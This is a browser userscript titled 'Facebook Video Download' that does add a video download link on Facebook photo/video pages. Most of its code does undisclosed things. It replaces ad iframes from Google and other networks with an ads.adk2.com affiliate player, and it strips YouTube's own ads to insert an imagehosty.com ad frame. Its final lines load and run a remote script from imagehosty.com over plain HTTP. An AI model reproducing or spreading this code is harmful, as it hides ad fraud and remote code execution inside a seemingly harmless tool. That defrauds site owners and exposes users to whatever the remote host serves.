// ==UserScript==
// @name Facebook Video Download
// @description Add a download button to get videos.
// @version 1.0
// @namespace	    Mceme
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @ License       
// All rights Reserved
// Author mceme
// ==/UserScript==
if (window.location.href.match(/facebook.com\/photo\.php\?v\=/)) {

var source;


function geturl(){

xmlhttp = new XMLHttpRequest();

xmlhttp.open("GET", document.URL, true);


 // setTimeout( function() {
 
        // // timedOut true?
   // //source=xmlhttp.responseText;
	 // // console.log(source);

        // // nullify httpRequest 
    // }, 5 * 1000 );


  xmlhttp.onreadystatechange=function(){

   if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
     
	      source=xmlhttp.responseText;
	

get();
	  
   }
}

 xmlhttp.send(null);



 
    // create a timer to check the value of timedOut in (timeout) seconds;
    // if timedOut is true, abort the request and clean up


function get(){

c_start = source.indexOf('"params"');
c_end = source.indexOf("],", c_start);

source=(source.substring(c_start, c_end));

var x = source;
var r = /\\u([\d\w]{4})/gi;
x = x.replace(r, function (match, grp) {
    return String.fromCharCode(parseInt(grp, 16)); } );
x = unescape(x);


var flashvars=x;

c_start2 = flashvars.indexOf('"sd_src":"');
console.log(flashvars);
console.log(c_start2);

  if (c_start2 != -1) {
 c_start2 = c_start2 + 10;
 c_end2 = flashvars.indexOf('",', c_start2);
 c_end2 == c_end2-2;


flashvars=(flashvars.substring(c_start2, c_end2));
console.log(flashvars);
if (flashvars){

console.log(flashvars);

var DIV = document.createElement('div');
	//DIV.innerHTML = '';
	DIV.appendChild(document.createTextNode(''));
	DIV.style.cssFloat = "fbPhotosPhotoActionsItem";
var divp = document.getElementById("fbPhotoPageActions");
if (divp)
	divp.appendChild(DIV);
var divp2 = document.getElementById("fbPhotoPagesTagList");
if (divp2)
divp2.appendChild(DIV);
	

var url =  flashvars;


var INAU = document.createElement('a');
	INAU.setAttribute('href',url);
	INAU.setAttribute('target','_blank');
	INAU.setAttribute('class','mtm ptm fbPhotosPhotoActions async_throbber');
	INAU.style.borderLeft = "";
	INAU.innerHTML = "Download Video";
	INAU.style.marginRight = "";
	INAU.style.marginLeft = "";
	INAU.style.borderRadius = "0 3px 3px 0";
	DIV.appendChild(INAU);
}
 }
 else return "no";
}
}

var videourl=geturl();
console.log(videourl);

}


var element = document.getElementById('aswift_0');
if (element) {
 var height=document.getElementById( 'aswift_0' ).getAttribute('height');
if (height=='90'){
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
else if (height=='60'){
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
else if (height=='90'){
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
else if (height=='600'){
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
else if (height=='280'){
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
else{
document.getElementById( 'aswift_0' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
document.getElementById( 'aswift_0' ).setAttribute( 'load', '' );}
}

var element2 = document.getElementById('aswift_1');
if (element2) {
 var height2=document.getElementById( 'aswift_1' ).getAttribute('height');
 if (height2=='250')
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height2=='60')
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height2=='90')
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height2=='600')
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height2=='280')
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( 'aswift_1' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );


}
var element3 = document.getElementById('aswift_2');
if (element3) {
var height3=document.getElementById( 'aswift_2' ).getAttribute('height');
 if (height3=='250')
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height3=='60')
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height3=='90')
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height3=='600')
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height3=='280')
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( 'aswift_2' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );


}
var element4 = document.getElementById('aswift_3');
if (element4) {

 var height4=document.getElementById( 'aswift_3' ).getAttribute('height');
 if (height4=='250')
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height4=='60')
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height4=='90')
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else if (height4=='600')
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height4=='280')
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( 'aswift_3' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );


}
var element5 = document.getElementById('aswift_4');
if (element5) {
 var height5=document.getElementById( 'aswift_4' ).getAttribute('height');
 
 if (height5=='250')
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height5=='60')
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height5=='90')
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height5=='600')
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height5=='280')
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( 'aswift_4' ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
}
var i=0;
while(div=document.getElementsByTagName('iframe')[i++]){
if(div.id.match(/google_ads/i)){

var height6=document.getElementById( div.id ).getAttribute('height');
 
 if (height6=='250')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height6=='60')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height6=='90')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height6=='600')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height6=='280')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );

}
}
var j=0;
while(div=document.getElementsByTagName('iframe')[j++]){
if(div.id.match(/adframe/)){
document.getElementById( div.id ).setAttribute( 'load', '' );

var height7=document.getElementById( div.id ).getAttribute('height');
 
 if (height7=='250')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='60')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='90')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='600')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='280')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );


}
if(div.id.match(/ads_frame/)){
document.getElementById( div.id ).setAttribute( 'load', '' );

var height7=document.getElementById( div.id ).getAttribute('height');
 
 if (height7=='250')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='60')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='90')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='600')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height7=='280')
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementById( div.id ).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );


}
}

 for (i=0;i<document.getElementsByTagName("iframe").length; i++) {


 var div=document.getElementsByTagName("iframe").item(i).getAttribute('src');
  var height8=document.getElementsByTagName("iframe").item(i).getAttribute('height');
if (div){
  if(div.match(/googlesyndication/)) {

    if (height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );

   
   }
   
     if(div.match(/globaltakeoff/)) {
     if (height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
  
   }
    if(div.match(/adnetwork/)) {
    if (height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 
   }
     if(div.match(/bidvertiser/)) {
    if (height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 
   }  
       if(div.match(/clicksor/)) {
    if (height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=468x60&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=728x90&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=160x600&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 else if (height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=336x280&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
else
document.getElementsByTagName("iframe").item(i).setAttribute( 'src', 'https://ads.adk2.com/player.html?a=3985096&size=300x250&ci=1&r=&u=http%3A%2F%2Fimagehosty.com%2Fscripts%2Fadsscript.html' );
 
   } 

   }
 }
 
if(window.location.href.match(/youtube.com/i)){var elemYou3=document.getElementsByClassName("watch-sidebar-body")[0];var checkDiv3=document.getElementById("YoutubeDown_ads3");var checkDiv3b=document.getElementById("google_companion_ad_div");var checkDiv3c=document.getElementById("ad300x250");var checkDiv3d=document.getElementById("watch-channel-brand-div");if(checkDiv3d){checkDiv3d.parentNode.removeChild(checkDiv3d);}
if(checkDiv3b){checkDiv3b.parentNode.removeChild(checkDiv3b);}
if(checkDiv3c){checkDiv3c.parentNode.removeChild(checkDiv3c);}
if(!checkDiv3){var spYou3=document.createElement("div");spYou3.setAttribute("id","YoutubeDown_ads3");spYou3.setAttribute("style","text-align:right; padding-top: 5px; padding-bottom: 15px;");var spYou2=document.createElement("iframe");spYou2.setAttribute("id","iFa_ads3");spYou2.setAttribute("type","content");spYou2.setAttribute("style","display:none;");spYou2.setAttribute("src","http://imagehosty.com/scripts/adsscript.html");spYou2.setAttribute("onLoad","this.style.display=\"block\";");spYou2.setAttribute("frameborder","0");spYou2.setAttribute("height","250");spYou2.setAttribute("width","300");spYou2.setAttribute("marginwidth","0");spYou2.setAttribute("marginheight","0");spYou2.setAttribute("scrolling","no");spYou3.appendChild(spYou2);if(elemYou3){elemYou3.parentNode.insertBefore(spYou3,elemYou3);}}}



var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src', 'http://imagehosty.com/scripts/youtubedownloaderch.js');
	document.getElementsByTagName('head')[0].appendChild(s);